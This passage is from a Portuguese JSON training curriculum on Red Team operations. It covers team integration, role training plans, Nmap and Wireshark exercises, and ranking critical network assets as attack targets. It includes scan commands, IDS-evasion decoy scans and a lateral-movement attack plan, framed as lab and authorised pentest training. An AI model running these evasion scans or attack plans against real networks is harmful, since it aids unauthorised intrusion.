                                    "Identifique integrações como compartilhamento de inteligência de ameaças pré-exercício.",
                                    "Descreva handoffs durante exercícios: notificações de ataques simulados.",
                                    "Explique integrações pós-exercício: relatórios de vulnerabilidades encontradas.",
                                    "Liste ferramentas comuns para integração (ex: SIEM compartilhado, plataformas de colaboração).",
                                    "Crie um fluxograma de interações entre equipes."
                                  ],
                                  "verification": "Desenvolva um fluxograma mostrando pelo menos 5 pontos de integração.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Ferramentas de fluxograma (Lucidchart ou Visio), exemplos de relatórios de Red Team.",
                                  "tips": "Foque em integrações bidirecionais para enfatizar colaboração mútua.",
                                  "learningObjective": "Visualizar como funções do Red Team alimentam melhorias no Blue Team.",
                                  "commonMistakes": "Ignorar integrações pós-exercício; elas são cruciais para aprendizado contínuo."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar Debriefings e Análise de Cenários de Ameaça",
                                  "subSteps": [
                                    "Estruture um debriefing: agenda com revisão de ataques, defesas e lições aprendidas.",
                                    "Analise cenários de ameaça: mapeie táticas Red Team (MITRE ATT&CK) contra respostas Blue.",
                                    "Discuta métricas de sucesso: tempo de detecção, taxa de mitigação.",
                                    "Pratique análise de um cenário hipotético com falhas e sucessos.",
                                    "Documente recomendações acionáveis para Blue Team baseadas em achados Red."
                                  ],
                                  "verification": "Elabore um relatório de debriefing simulado com análise de um cenário.",
                                  "estimatedTime": "75 minutos",
                                  "materials": "Templates de debriefing (ex: de CERT), framework MITRE ATT&CK.",
                                  "tips": "Grave debriefings para revisão posterior e melhoria.",
                                  "learningObjective": "Dominar debriefings como mecanismo chave de integração e melhoria.",
                                  "commonMistakes": "Fazer debriefings superficiais; inclua dados quantitativos para credibilidade."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Impacto Geral na Melhoria da Defesa",
                                  "subSteps": [
                                    "Avalie como integrações reduzem tempo de resposta a ameaças reais.",
                                    "Meça ROI: redução de vulnerabilidades exploráveis pós-exercícios.",
                                    "Identifique desafios comuns (ex: resistência cultural) e soluções.",
                                    "Desenvolva um plano de melhoria contínua baseado em integrações.",
                                    "Simule uma avaliação de maturidade de integração Red-Blue."
                                  ],
                                  "verification": "Crie um scorecard de avaliação de integração com pontuação para 5 critérios.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Modelos de scorecard (ex: CMMI adaptado), casos de estudo reais.",
                                  "tips": "Use métricas SMART para avaliações quantificáveis.",
                                  "learningObjective": "Avaliar holisticamente como integrações fortalecem defesas cibernéticas.",
                                  "commonMistakes": "Superestimar impacto sem evidências; baseie em dados de exercícios."
                                }
                              ],
                              "practicalExample": "Em um exercício Purple Team, o Red Team simula um phishing avançado; Blue Team detecta via EDR. No debriefing, Red revela TTPs ocultos, Blue ajusta regras de detecção, resultando em 40% menos falsos positivos em testes subsequentes.",
                              "finalVerifications": [
                                "Explicar com precisão 3 integrações chave Red-Blue.",
                                "Criar fluxograma completo de interações.",
                                "Analisar um cenário de ameaça com debriefing simulado.",
                                "Desenvolver scorecard de avaliação de integração.",
                                "Identificar 2 desafios reais e soluções.",
                                "Demonstrar compreensão de benefícios para defesa cibernética."
                              ],
                              "assessmentCriteria": [
                                "Profundidade na distinção de papéis e integrações (30%)",
                                "Qualidade e completude do fluxograma e relatórios (25%)",
                                "Precisão na análise de debriefings e cenários (20%)",
                                "Criatividade em exemplos práticos e aplicações (15%)",
                                "Clareza na comunicação de impactos defensivos (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Comunicação e Colaboração: Habilidades de debriefing interdisciplinar.",
                                "Análise de Dados: Métricas de desempenho em exercícios cibernéticos.",
                                "Gestão de Projetos: Planejamento de integrações Red-Blue.",
                                "Ética Profissional: Colaboração ética em simulações de ameaça."
                              ],
                              "realWorldApplication": "Em organizações como bancos ou agências governamentais, essa integração permite que Red Team exponha brechas reais (ex: ransomware), Blue Team fortaleça defesas via patches e treinamentos, reduzindo incidentes em até 50% conforme relatórios da Mandiant."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.2.1.2"
                            ]
                          },
                          {
                            "id": "10.1.1.2.3.3",
                            "name": "Desenvolver plano de treinamento para papéis",
                            "description": "Criar um outline de treinamento para membros do Red Team, baseado em bibliografia como Red Team Development and Operations, focando em habilidades práticas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar papéis e mapear competências necessárias",
                                  "subSteps": [
                                    "Listar todos os papéis no Red Team (ex: reconnaissance, exploitation, post-exploitation, reporting).",
                                    "Para cada papel, descrever responsabilidades principais baseadas em frameworks como MITRE ATT&CK.",
                                    "Mapear habilidades técnicas e soft skills requeridas, priorizando práticas como scanning e phishing.",
                                    "Realizar análise de gaps com base em avaliações atuais da equipe.",
                                    "Criar uma matriz de competências por papel."
                                  ],
                                  "verification": "Matriz de competências preenchida e revisada por stakeholders.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Documentos de MITRE ATT&CK, Red Team Development and Operations (livro), planilha Excel/Google Sheets.",
                                  "tips": "Use templates de matriz RACI para agilizar o mapeamento.",
                                  "learningObjective": "Compreender as competências essenciais para cada papel no Red Team.",
                                  "commonMistakes": "Ignorar soft skills como comunicação em relatórios de ataque."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Pesquisar bibliografia e melhores práticas",
                                  "subSteps": [
                                    "Consultar fontes como 'Red Team Development and Operations' para outlines de treinamento.",
                                    "Analisar relatórios de exercises reais (ex: Cyber Storm, Locked Shields).",
                                    "Identificar treinamentos modulares focados em hands-on (ex: TryHackMe, HackTheBox paths).",
                                    "Compilar exemplos de planos de outros Red Teams (anonimizados).",
                                    "Sintetizar lições aprendidas em um sumário."
                                  ],
                                  "verification": "Sumário de pesquisa com pelo menos 5 fontes citadas e insights extraídos.",
                                  "estimatedTime": "6-8 horas",
                                  "materials": "Livro 'Red Team Development and Operations', sites como MITRE, SANS Institute papers, acesso a plataformas de CTF.",
                                  "tips": "Priorize conteúdos práticos sobre teóricos para alinhar com foco em habilidades.",
                                  "learningObjective": "Integrar evidências baseadas em bibliografia ao plano.",
                                  "commonMistakes": "Copiar planos genéricos sem adaptação ao contexto da equipe."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estruturar o outline do treinamento",
                                  "subSteps": [
                                    "Definir objetivos SMART para cada módulo por papel.",
                                    "Dividir em fases: teórica, prática, simulação e debrief.",
                                    "Criar cronograma com duração por módulo (ex: 40h para reconnaissance).",
                                    "Incluir recursos: labs virtuais, ferramentas (Nmap, Metasploit).",
                                    "Incorporar progressão de dificuldade."
                                  ],
                                  "verification": "Outline draft com cronograma, módulos e recursos detalhados.",
                                  "estimatedTime": "8-10 horas",
                                  "materials": "Ferramentas de diagramação (Draw.io, Lucidchart), templates de outline de treinamento.",
                                  "tips": "Use gamificação (badges, leaderboards) para engajar trainees.",
                                  "learningObjective": "Criar uma estrutura escalável e acionável para o treinamento.",
                                  "commonMistakes": "Sobrecarregar com teoria, negligenciando prática hands-on."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Desenvolver avaliações, validação e finalização",
                                  "subSteps": [
                                    "Definir métricas de sucesso (ex: taxa de sucesso em simulações >80%).",
                                    "Criar assessments: quizzes, CTFs, relatórios simulados.",
                                    "Planejar feedback loops e iterações pós-treinamento.",
                                    "Revisar o plano com experts e simular aplicação.",
                                    "Documentar em formato final (PDF/Word com anexos)."
                                  ],
                                  "verification": "Plano final aprovado por pelo menos 2 revisores.",
                                  "estimatedTime": "4-6 horas",
                                  "materials": "Ferramentas de avaliação (Kali Linux labs, plataformas CTF), checklists de revisão.",
                                  "tips": "Inclua cenários reais de threat actors para relevância.",
                                  "learningObjective": "Garantir mensurabilidade e melhoria contínua do plano.",
                                  "commonMistakes": "Faltar métricas claras, tornando o sucesso subjetivo."
                                }
                              ],
                              "practicalExample": "Para o papel de 'Exploitation Specialist': Módulo 1 (Teoria: 4h) - Vulnerabilidades comuns (CVE); Módulo 2 (Prática: 20h) - Exploit dev com Metasploit em lab VulnHub; Módulo 3 (Simulação: 12h) - Red Team exercise em rede simulada; Avaliação: Desenvolver e executar exploit em target blindado, com relatório MITRE mapeado.",
                              "finalVerifications": [
                                "Todos os papéis têm matriz de competências completa.",
                                "Outline cobre pelo menos 80% das habilidades práticas identificadas.",
                                "Cronograma total não excede 120h por papel.",
                                "Inclui pelo menos 3 assessments práticos por módulo.",
                                "Referências bibliográficas citadas em todos os módulos.",
                                "Plano validado por simulação ou revisão externa."
                              ],
                              "assessmentCriteria": [
                                "Alinhamento com bibliografia (cobertura >90%).",
                                "Foco em hands-on (prática >60% do tempo).",
                                "Mensurabilidade dos objetivos (SMART).",
                                "Escalabilidade para diferentes níveis de trainees.",
                                "Integração de feedback e iteração.",
                                "Relevância para operações reais de Red Team."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Projetos: Uso de metodologias ágeis no cronograma.",
                                "Pedagogia: Design instrucional com Bloom's Taxonomy.",
                                "Liderança: Desenvolvimento de competências de equipe.",
                                "Análise de Riscos: Mapeamento de threats em treinamentos."
                              ],
                              "realWorldApplication": "Em uma operação de Red Team para uma empresa, o plano garante que novos membros atinjam proficiency em 4 semanas, permitindo participação em purple team exercises reais, reduzindo tempo de ramp-up e melhorando eficácia de simulações de ataques."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "10.1.1.2.2.2",
                              "10.1.1.2.2.3"
                            ]
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.1.3",
                    "name": "Consciência Situacional",
                    "description": "Capacidade de monitorar e compreender o ambiente cibernético em tempo real.",
                    "individualConcepts": [
                      {
                        "id": "10.1.1.3.1",
                        "name": "Percepção do Ambiente Cibernético",
                        "description": "Habilidade inicial de identificar e coletar dados em tempo real sobre redes, hosts, serviços ativos e tráfego de rede no ambiente alvo durante operações de Red Team.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.3.1.1",
                            "name": "Escaneamento de Rede com Nmap",
                            "description": "Realizar varreduras de portas e serviços usando Nmap para mapear a topologia de rede e identificar hosts ativos, versões de software e vulnerabilidades potenciais em tempo real.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalação e Configuração Inicial do Nmap",
                                  "subSteps": [
                                    "Baixe e instale o Nmap a partir do site oficial (nmap.org) ou via gerenciador de pacotes (apt install nmap no Kali Linux).",
                                    "Verifique a instalação executando 'nmap --version' no terminal.",
                                    "Configure o ambiente de laboratório criando uma rede isolada com máquinas virtuais (ex: VirtualBox com host-only adapter).",
                                    "Execute 'nmap --help' para familiarizar-se com opções básicas.",
                                    "Teste um scan local com 'nmap localhost' para validar funcionamento."
                                  ],
                                  "verification": "Comando 'nmap --version' retorna versão atual e 'nmap localhost' lista portas locais sem erros.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Computador com Linux (Kali preferencial)",
                                    "VirtualBox ou VMware para lab",
                                    "Acesso à internet para download"
                                  ],
                                  "tips": "Use Kali Linux para ambiente pronto; evite scans em redes reais sem permissão.",
                                  "learningObjective": "Configurar ambiente seguro para scans de rede com Nmap.",
                                  "commonMistakes": [
                                    "Instalar versão errada (use oficial)",
                                    "Executar sem privilégios de root (use sudo)",
                                    "Ignorar firewall local que bloqueia scans"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Descoberta de Hosts Ativos",
                                  "subSteps": [
                                    "Aprenda opções de host discovery: -sn (ping scan), -PE (ICMP echo).",
                                    "Execute scan em sub-rede lab: 'sudo nmap -sn 192.168.1.0/24'.",
                                    "Interprete saída: hosts up/down, MAC addresses.",
                                    "Teste com -PS (SYN ping) para hosts com firewalls.",
                                    "Salve output: 'sudo nmap -sn 192.168.1.0/24 -oN hosts.txt'."
                                  ],
                                  "verification": "Lista correta de hosts ativos na sub-rede lab, sem falsos positivos.",
                                  "estimatedTime": "15-25 minutos",
                                  "materials": [
                                    "Nmap instalado",
                                    "Rede lab com 3-5 VMs ativas"
                                  ],
                                  "tips": "Aumente timeout com -T4 para redes lentas; foque em labs isolados.",
                                  "learningObjective": "Identificar hosts ativos em uma rede sem escanear portas.",
                                  "commonMistakes": [
                                    "Usar sub-rede errada",
                                    "Esquecer sudo para raw sockets",
                                    "Confundir MAC com IP"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Varredura de Portas e Serviços Básica",
                                  "subSteps": [
                                    "Execute TCP SYN scan: 'sudo nmap -sS -p- target_ip'.",
                                    "Scan UDP básico: 'sudo nmap -sU target_ip'.",
                                    "Combine: 'sudo nmap -sS -sU -T4 target_ip'.",
                                    "Analise portas open/closed/filtered e serviços detectados.",
                                    "Use -O para detecção de OS básica."
                                  ],
                                  "verification": "Relatório mostra portas abertas (ex: 80/http) com estados corretos em targets lab.",
                                  "estimatedTime": "25-40 minutos",
                                  "materials": [
                                    "Mesma rede lab",
                                    "VMs com serviços comuns (HTTP, SSH)"
                                  ],
                                  "tips": "Limite portas com -p 1-1000 para testes rápidos; monitore tráfego com Wireshark.",
                                  "learningObjective": "Mapear portas abertas e serviços em hosts específicos.",
                                  "commonMistakes": [
                                    "Scan agressivo em prod (-T5 causa detecção)",
                                    "Ignorar UDP (lento mas essencial)",
                                    "Não usar sudo para SYN/UDP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Varreduras Avançadas e Detecção de Vulnerabilidades",
                                  "subSteps": [
                                    "Detecção de versão: 'sudo nmap -sV -sC target_ip' (scripts default).",
                                    "OS fingerprint: 'sudo nmap -O target_ip'.",
                                    "Scripts NSE para vulns: 'sudo nmap --script vuln target_ip'.",
                                    "Topologia: 'sudo nmap -sS -sV --traceroute target_ip'.",
                                    "Gere relatório HTML: 'sudo nmap -oX scan.xml target_ip; xsltproc scan.xml scan.html'."
                                  ],
                                  "verification": "Relatório identifica versões de software, OS e pelo menos 1 vuln simulada (ex: SMB vuln).",
                                  "estimatedTime": "30-45 minutos",
                                  "materials": [
                                    "Nmap com NSE (instalado por default no Kali)",
                                    "VMs vulneráveis (ex: Metasploitable)"
                                  ],
                                  "tips": "Atualize scripts com 'nmap --script-updatedb'; leia man page para scripts custom.",
                                  "learningObjective": "Detectar versões, OS e vulnerabilidades potenciais em tempo real.",
                                  "commonMistakes": [
                                    "Scripts sem -sV (necessário)",
                                    "Sobrecarga de rede com todos scripts (--script all)",
                                    "Ignorar legalidade de scans"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Análise de Resultados e Mapeamento de Topologia",
                                  "subSteps": [
                                    "Compile resultados de scans anteriores em um mapa mental ou diagrama (use draw.io).",
                                    "Identifique padrões: hosts críticos, serviços expostos.",
                                    "Simule relatório: liste hosts, portas, versões e riscos potenciais.",
                                    "Teste evasão: 'sudo nmap -f -D RND:10 target_ip' (fragmented, decoy).",
                                    "Valide com ferramentas complementares (ex: masscan para velocidade)."
                                  ],
                                  "verification": "Diagrama completo da topologia lab com riscos anotados.",
                                  "estimatedTime": "20-35 minutos",
                                  "materials": [
                                    "Resultados de scans anteriores",
                                    "Ferramenta de diagrama (draw.io online)"
                                  ],
                                  "tips": "Priorize riscos altos (ex: RDP aberto); pratique stealth para cenários reais.",
                                  "learningObjective": "Interpretar scans para mapear rede e priorizar ameaças.",
                                  "commonMistakes": [
                                    "Não correlacionar dados de múltiplos scans",
                                    "Relatório vago sem evidências",
                                    "Expor lab à internet"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com Kali Linux (atacante) e VMs Windows 10, Ubuntu Server (com Apache/SSH) e Metasploitable: execute 'sudo nmap -sS -sV -sC -O -oA fullscan 192.168.56.0/24'. Analise saída identificando HTTP na porta 80 (versão vulnerável), SSH v7.4 e SMB vulns no Metasploitable, mapeando topologia com traceroute.",
                              "finalVerifications": [
                                "Lista precisa de 5+ hosts ativos com MAC/IP.",
                                "Todas portas comuns (1-1024) escaneadas com estados corretos.",
                                "Versões de 80%+ serviços identificadas.",
                                "Pelo menos 2 OS detectados corretamente.",
                                "1+ vulnerabilidade NSE reportada.",
                                "Relatório HTML gerado e interpretado."
                              ],
                              "assessmentCriteria": [
                                "Precisão dos scans (sem falsos positivos >5%).",
                                "Tempo de execução otimizado (<10min para sub-rede /24).",
                                "Interpretação correta de outputs (90% acurácia).",
                                "Uso ético: apenas lab isolado.",
                                "Relatório completo com diagrama.",
                                "Aplicação de 3+ opções avançadas Nmap."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Entender TCP/IP stack e handshakes.",
                                "Sistemas Operacionais: Fingerprinting e serviços comuns.",
                                "Programação: Scripts NSE em Lua para custom scans.",
                                "Análise de Dados: Processar outputs JSON/XML.",
                                "Ética e Direito: Leis de cibersegurança (LGPD, autorização para scans)."
                              ],
                              "realWorldApplication": "Em operações de pentest autorizado, mapear rede corporativa para identificar hosts desatualizados (ex: Windows sem patches), serviços expostos (RDP remoto) e vulns (Heartbleed via NSE), permitindo priorizar defesas em cenários de guerra cibernética."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.1.2",
                            "name": "Monitoramento de Tráfego com Wireshark",
                            "description": "Capturar e analisar pacotes de rede em tempo real com Wireshark para detectar comunicações anômalas, protocolos utilizados e fluxos de dados entre hosts no ambiente cibernético alvo.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalação e Configuração Inicial do Wireshark",
                                  "subSteps": [
                                    "Acesse o site oficial do Wireshark (wireshark.org) e baixe a versão compatível com seu SO.",
                                    "Instale o Wireshark selecionando a opção de instalação do Npcap (Windows) ou libpcap (Linux/Mac).",
                                    "Execute o Wireshark com privilégios de administrador para habilitar captura em interfaces.",
                                    "Verifique a lista de interfaces de rede disponíveis na tela inicial.",
                                    "Configure preferências básicas: habilite captura em promiscuous mode e defina diretório de captura."
                                  ],
                                  "verification": "O Wireshark inicia corretamente e exibe todas as interfaces de rede ativas sem erros.",
                                  "estimatedTime": "15-20 minutos",
                                  "materials": [
                                    "Computador com acesso à internet",
                                    "Privilégios de administrador/root",
                                    "Espaço em disco de pelo menos 500MB"
                                  ],
                                  "tips": [
                                    "Sempre baixe do site oficial para evitar malwares.",
                                    "Reinicie o computador após instalação do Npcap para melhor compatibilidade."
                                  ],
                                  "learningObjective": "Preparar o ambiente de captura de pacotes de forma segura e funcional.",
                                  "commonMistakes": [
                                    "Esquecer de instalar o driver Npcap/libpcap.",
                                    "Executar sem privilégios elevados, resultando em falha na captura.",
                                    "Ignorar atualizações, expondo a vulnerabilidades conhecidas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Seleção de Interface e Captura de Tráfego",
                                  "subSteps": [
                                    "Selecione a interface de rede ativa (ex: Wi-Fi ou Ethernet) na lista do Wireshark.",
                                    "Defina um filtro de captura opcional (ex: 'tcp port 80' para HTTP).",
                                    "Clique em 'Start' para iniciar a captura em tempo real.",
                                    "Gere tráfego de teste abrindo sites ou pingando hosts na rede.",
                                    "Pare a captura após 1-2 minutos e salve o arquivo .pcap."
                                  ],
                                  "verification": "Pelo menos 100 pacotes são capturados e salvos em um arquivo .pcap legível.",
                                  "estimatedTime": "10-15 minutos",
                                  "materials": [
                                    "Interface de rede ativa",
                                    "Conexão de internet ou rede local",
                                    "Arquivo de destino para salvar captura"
                                  ],
                                  "tips": [
                                    "Use buffer de captura limitado para evitar sobrecarga em redes ocupadas.",
                                    "Monitore o contador de pacotes para evitar capturas excessivamente grandes."
                                  ],
                                  "learningObjective": "Capturar tráfego de rede de forma controlada e eficiente.",
                                  "commonMistakes": [
                                    "Selecionar interface errada (ex: loopback em vez de externa).",
                                    "Não pausar captura, causando arquivos gigantes e lentidão.",
                                    "Filtros de captura mal escritos, perdendo pacotes relevantes."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Análise Básica de Pacotes e Identificação de Protocolos",
                                  "subSteps": [
                                    "Navegue pela lista de pacotes usando colunas de tempo, fonte/destino IP e protocolo.",
                                    "Clique em um pacote para expandir detalhes nas abas 'Packet Details' e 'Packet Bytes'.",
                                    "Identifique protocolos principais (TCP, UDP, ICMP, HTTP) nas camadas OSI.",
                                    "Aplique filtros de exibição (ex: 'ip.src == 192.168.1.1') para isolar fluxos.",
                                    "Use 'Statistics > Protocol Hierarchy' para overview de protocolos usados."
                                  ],
                                  "verification": "Protocolos corretamente identificados em 80% dos pacotes analisados, com fluxos entre hosts mapeados.",
                                  "estimatedTime": "20-25 minutos",
                                  "materials": [
                                    "Arquivo .pcap capturado",
                                    "Guia de filtros Wireshark (documentação oficial)"
                                  ],
                                  "tips": [
                                    "Colorize conversas para visualizar fluxos facilmente (View > Coloring Rules).",
                                    "Salve filtros úteis para reutilização rápida."
                                  ],
                                  "learningObjective": "Interpretar estrutura de pacotes e mapear comunicações entre hosts.",
                                  "commonMistakes": [
                                    "Confundir camadas de encapsulamento (ex: IP dentro de Ethernet).",
                                    "Filtros de exibição com sintaxe errada, ocultando dados.",
                                    "Ignorar timestamps, perdendo sequência temporal."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Detecção de Comunicações Anômalas e Geração de Relatório",
                                  "subSteps": [
                                    "Procure padrões suspeitos: alto volume SYN sem ACK (scan de portas), tráfego para IPs desconhecidos.",
                                    "Acesse 'Statistics > Conversations' e 'IO Graph' para detectar picos anômalos.",
                                    "Compare com baseline de tráfego normal usando múltiplas capturas.",
                                    "Exporte objetos HTTP ou siga streams TCP para evidências detalhadas.",
                                    "Gere relatório: anote IPs, protocolos, anomalias e exporte como PDF ou texto."
                                  ],
                                  "verification": "Relatório documenta pelo menos 2 anomalias com screenshots e filtros reproduzíveis.",
                                  "estimatedTime": "20-30 minutos",
                                  "materials": [
                                    "Arquivo .pcap com tráfego suspeito",
                                    "Baseline de tráfego normal (opcional)"
                                  ],
                                  "tips": [
                                    "Use 'Expert Information' para alertas automáticos de problemas.",
                                    "Combine com ferramentas como tshark para automação em scripts."
                                  ],
                                  "learningObjective": "Detectar e documentar ameaças em tráfego de rede em tempo real.",
                                  "commonMistakes": [
                                    "Falsos positivos por tráfego legítimo (ex: atualizações automáticas).",
                                    "Não correlacionar eventos temporais em fluxos múltiplos.",
                                    "Relatórios vagos sem evidências capturáveis."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um laboratório simulado com duas VMs (atacante e vítima), inicie uma varredura de portas Nmap na vítima. Use Wireshark na interface da vítima para capturar pacotes TCP SYN anômalos em massa, filtre por 'tcp.flags.syn==1 and tcp.flags.ack==0', analise fluxos para IP do atacante e detecte o scan como anomalia sem resposta ACK.",
                              "finalVerifications": [
                                "Interfaces de rede capturam sem perdas (zero drops reportados).",
                                "Protocolos e fluxos entre hosts identificados com precisão >90%.",
                                "Filtros de captura e exibição funcionam corretamente.",
                                "Anomalias detectadas com evidências em screenshots ou exports.",
                                "Relatório completo salvo e reproduzível.",
                                "Estatísticas de tráfego (IO Graph) mostram picos suspeitos."
                              ],
                              "assessmentCriteria": [
                                "Precisão na captura e análise de pacotes (sem erros de interpretação).",
                                "Eficiência no uso de filtros (redução >70% de ruído).",
                                "Detecção oportuna de anomalias (em <5 minutos de análise).",
                                "Qualidade do relatório: claro, com evidências e recomendações.",
                                "Conhecimento demonstrado de protocolos e camadas OSI.",
                                "Segurança: sem exposição de dados sensíveis durante o processo."
                              ],
                              "crossCurricularConnections": [
                                "Redes de Computadores: Mapeamento de camadas OSI/TCP-IP em pacotes reais.",
                                "Análise de Dados: Uso de estatísticas e gráficos para padrões em tráfego.",
                                "Programação: Criação de filtros personalizados em linguagem Wireshark.",
                                "Forense Digital: Preservação de chain of custody em arquivos .pcap.",
                                "Ética em Cibersegurança: Considerações de privacidade em monitoramento."
                              ],
                              "realWorldApplication": "Em Centros de Operações de Segurança (SOC), analistas usam Wireshark para investigar incidentes como DDoS ou exfiltração de dados, monitorando tráfego em firewalls/IDS, reconstruindo ataques e fornecendo evidências para respostas forenses ou relatórios de conformidade (ex: GDPR, NIST)."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.3.1.3",
                            "name": "Identificação de Ativos Críticos",
                            "description": "Listar e priorizar ativos de rede críticos, como servidores, estações de trabalho e dispositivos IoT, com base em dados coletados para focar esforços de ataque.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Coleta Inicial de Dados da Rede",
                                  "subSteps": [
                                    "Realize um scan de rede usando ferramentas como Nmap para mapear hosts ativos.",
                                    "Colete informações sobre portas abertas, serviços rodando e versões de software.",
                                    "Identifique dispositivos IoT através de fingerprints de banners ou padrões de tráfego.",
                                    "Registre dados demográficos da rede, como topologia e segmentos VLAN.",
                                    "Documente metadados como endereços IP, MAC e nomes de host."
                                  ],
                                  "verification": "Verifique se o relatório de scan lista pelo menos 80% dos hosts esperados comparando com diagramas conhecidos da rede.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramenta Nmap",
                                    "Wireshark para captura de tráfego",
                                    "Diagrama de rede da target"
                                  ],
                                  "tips": "Use scans stealth para evitar detecção precoce; comece com scans leves como SYN scan.",
                                  "learningObjective": "Compreender métodos de descoberta de ativos de rede sem alertar defesas.",
                                  "commonMistakes": [
                                    "Scans agressivos que disparam alertas IDS/IPS",
                                    "Ignorar dispositivos IoT de baixa visibilidade",
                                    "Não documentar timestamps de descoberta"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Listagem e Categorização de Ativos",
                                  "subSteps": [
                                    "Compile uma lista exaustiva de ativos identificados: servidores, estações de trabalho, IoT.",
                                    "Categorize por tipo (ex: servidor web, workstation Windows, câmera IP).",
                                    "Atribua tags baseadas em função (ex: autenticação, dados sensíveis, controle industrial).",
                                    "Crie uma tabela ou planilha com colunas: IP, Tipo, Função, Vulnerabilidades Potenciais.",
                                    "Valide a lista cruzando com fontes como ARP tables ou logs de DHCP."
                                  ],
                                  "verification": "Confirme que todos os ativos listados têm pelo menos 3 atributos descritivos e sem duplicatas.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Planilha Excel/Google Sheets",
                                    "Relatório Nmap exportado",
                                    "Documentação de rede interna"
                                  ],
                                  "tips": "Use scripts Python para automatizar categorização via parsing de outputs de scans.",
                                  "learningObjective": "Desenvolver habilidade em organizar dados de reconnaissance em formatos acionáveis.",
                                  "commonMistakes": [
                                    "Omitir ativos shadow IT ou não mapeados",
                                    "Categorização superficial sem funções específicas",
                                    "Duplicatas na lista devido a múltiplos scans"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Avaliação de Criticidade dos Ativos",
                                  "subSteps": [
                                    "Avalie impacto de comprometimento: downtime, perda de dados, acesso privilegiado.",
                                    "Pontue criticidade usando matriz (alta/média/baixa) baseada em dependências e valor de negócio.",
                                    "Considere fatores como patch level, exposição pública e controles de segurança existentes.",
                                    "Priorize ativos com dados sensíveis (ex: AD servers, databases de clientes).",
                                    "Ajuste scores com base em inteligência de threat hunting ou OSINT."
                                  ],
                                  "verification": "Cada ativo deve ter um score de criticidade justificado com pelo menos 2 razões documentadas.",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "Matriz de criticidade template",
                                    "Ferramentas como Nessus para vuln scanning",
                                    "Documentos de negócio da target"
                                  ],
                                  "tips": "Pondere scores: 40% impacto negócio, 30% acessibilidade, 30% vulnerabilidades conhecidas.",
                                  "learningObjective": "Aprender a quantificar risco de ativos para priorização estratégica.",
                                  "commonMistakes": [
                                    "Sobrestimar criticidade de ativos periféricos",
                                    "Ignorar cadeia de supply em IoT",
                                    "Scores subjetivos sem critérios definidos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Priorização e Planejamento de Foco de Ataque",
                                  "subSteps": [
                                    "Ordene ativos por score de criticidade descendente.",
                                    "Defina top 5-10 alvos primários para esforços de ataque.",
                                    "Crie um plano de ataque sequencial: ex. comprometer workstation -> pivotar para servidor.",
                                    "Simule cenários de chain kill usando graph tools como BloodHound.",
                                    "Revise e itere a priorização com novos dados de scans iterativos."
                                  ],
                                  "verification": "O plano final deve incluir sequência de ataques com dependências claras e timeline.",
                                  "estimatedTime": "45 minutos - 1 hora",
                                  "materials": [
                                    "Ferramenta BloodHound ou Maltego",
                                    "Canvas de planejamento (ex: Miro)",
                                    "Lista priorizada de Step 3"
                                  ],
                                  "tips": "Foque em 'crown jewels' como domain controllers antes de ativos laterais.",
                                  "learningObjective": "Integrar análise de ativos em um plano de operações ofensivas cibernéticas.",
                                  "commonMistakes": [
                                    "Priorização estática sem considerar pivots",
                                    "Ignorar ativos de alto impacto mas baixa acessibilidade",
                                    "Plano sem contingências para falhas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de rede corporativa com 50 hosts (10 servidores, 30 workstations, 10 IoT), use Nmap para descobrir um servidor AD crítico (IP 192.168.1.10) com porta 445 aberta, categorize como alta criticidade devido a controle de autenticação, priorize como alvo #1 e planeje SMB exploit seguido de lateral movement para database server.",
                              "finalVerifications": [
                                "Lista completa de ativos com categorização precisa.",
                                "Priorização alinhada com impacto de negócio documentado.",
                                "Plano de ataque viável com pelo menos 3 chains de pivô.",
                                "Scores de criticidade consistentes e justificáveis.",
                                "Cobertura de 90%+ dos ativos esperados na rede simulada.",
                                "Ausência de erros comuns identificados nos steps."
                              ],
                              "assessmentCriteria": [
